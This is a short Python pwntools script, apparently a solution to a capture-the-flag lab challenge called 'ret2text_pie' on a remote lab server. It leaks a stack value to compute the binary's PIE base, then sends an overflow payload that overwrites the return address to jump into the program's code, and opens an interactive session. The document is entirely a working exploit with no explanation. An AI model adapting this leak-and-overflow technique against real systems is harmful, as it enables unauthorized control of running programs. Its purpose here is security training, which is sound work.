from pwn import *

# r = process('/media/sf_D_DRIVE/ret2text_pie/ret2text_pie')
r = remote('lab.scist.org', 33304)
for _ in range(4):
    print(r.recvline().decode())

r.sendline(b'A' * 10)

print(r.recv(5).decode() + '\n') # Hola
callBase = u64(r.recv(0x100)[0x40:0x48]) - 0x1203

for _ in range(4):
    print(r.recvline().decode())

r.sendline((b'A') * 0x100 + (b'A') * 8 + p64(callBase + 0x000011F1))
# print(r.recvline().decode())
r.interactive()
